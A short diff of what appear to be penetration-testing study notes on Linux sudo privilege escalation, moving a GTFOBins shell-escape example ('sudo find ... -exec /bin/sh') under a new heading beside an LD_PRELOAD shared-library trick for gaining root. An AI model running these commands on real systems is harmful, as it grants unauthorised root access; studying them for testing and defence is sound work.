@@ -77,6 +77,13 @@ Privilege Escalation: Kernel Exploits
     
 Privilege Escalation: Sudo
 
+    ## Shell Escape Sequences
+    
+    https://gtfobins.github.io/
+        e.g. sudo find . -exec /bin/sh \; -quit
+    
+    ## Environment Variables
+
     sudo -l
     
     env_keep+=LD_PRELOAD
@@ -93,9 +100,6 @@ Privilege Escalation: Sudo
             }
         gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
         sudo LD_PRELOAD=/tmp/preload.so find
-    
-    https://gtfobins.github.io/
-        e.g. sudo find . -exec /bin/sh \; -quit
     
 Privilege Escalation: SUID
 
